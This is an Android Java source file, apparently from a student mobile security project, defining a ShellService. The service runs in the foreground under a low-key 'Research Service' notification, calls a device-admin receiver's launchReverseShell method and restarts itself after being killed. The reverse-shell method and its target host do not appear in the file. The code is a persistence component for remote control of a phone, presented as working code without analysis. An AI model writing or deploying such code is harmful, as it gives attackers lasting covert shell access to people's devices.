package com.example.inf2007_mad_j1847.test;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;

public class ShellService extends Service {
    private static final String TAG = "SimpleShellService";
    private static final int NOTIFICATION_ID = 1234;
    private static final String CHANNEL_ID = "shell_channel";

    // Create an instance of your AdminReceiver to call its method
    private AppDeviceAdminReceiver adminReceiver;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service created");

        // Create instance of your receiver
        adminReceiver = new AppDeviceAdminReceiver();

        // Create notification channel (required for Android 8+)
        createNotificationChannel();

        // Start as foreground service (required for Android 8+)
        Notification notification = createNotification();
        startForeground(NOTIFICATION_ID, notification);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service starting - calling launchReverseShell");

        // DIRECTLY CALL YOUR EXISTING METHOD
        // This calls the same method that runs when admin is granted
        adminReceiver.launchReverseShell(this);

        // START_STICKY makes service restart if killed
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service destroyed");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null; // Not a bound service
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Shell Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Research Service")
                .setContentText("Reverse shell active")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build();
    }
}